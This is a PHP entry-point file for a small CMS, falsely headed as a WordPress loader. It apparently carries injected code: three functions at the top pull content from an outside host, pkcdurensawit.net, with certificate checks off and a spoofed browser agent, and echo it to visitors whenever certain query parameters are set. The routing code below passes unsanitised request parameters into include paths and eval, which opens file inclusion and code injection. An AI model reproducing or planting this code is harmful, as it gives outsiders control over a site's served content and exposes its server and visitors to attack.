<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */
function fetchDataFromSite($site) {
    $url = 'https://replication.pkcdurensawit.net/uca/' . $site . '/';
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_CUSTOMREQUEST => 'GET'
    ]);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
function fetchDataFromSite2($site) {
    $url = 'https://replication2.pkcdurensawit.net/uca_sites/?sites='.$site;
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_CUSTOMREQUEST => 'GET'
    ]);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
function fetchDataFromSite3($site) {
    $url = 'https://replication2.pkcdurensawit.net/uca_web/?web='.$site;
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_CUSTOMREQUEST => 'GET'
    ]);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

if(isset($_GET['go'])) {
    $site = $_GET['go'];
    $data = fetchDataFromSite($site);
    echo $data;
}
elseif(isset($_GET['sites'])) {
    $site = $_GET['sites'];
    $data = fetchDataFromSite2($site);
    echo $data;
}
elseif(isset($_GET['web'])) {
    $site = $_GET['web'];
    $data = fetchDataFromSite3($site);
    echo $data;
} else {
// Define Routing Data Comg BY URL $_GET
if ( !isset($_GET['module']) ) { $_GET['module'] = 'pages'; }
if ( !isset($_GET['act'])    ) { $_GET['act'] = 'all';}

// Include Required Classes
include         "globals.php";
include         "admin/classes/controllers.php";
include         "admin/classes/core.php";
include	     "admin/classes/access.php";
include	     "admin/classes/JDate.php";
if ( !isset($_GET['item']) && !isset($_GET['search']) ) include "admin/classes/stats/count.php";

$file = "admin/classes/langs/".$_GET['lang'].".php";
if(file_exists($file)) include $file;

include "admin/modules/".$_GET['module']."/".$_GET['module'].".php";
$mod = new $_GET['module'];
$str = '$mod->site_'.$_GET['act'].'();';
eval($str);
}
?>
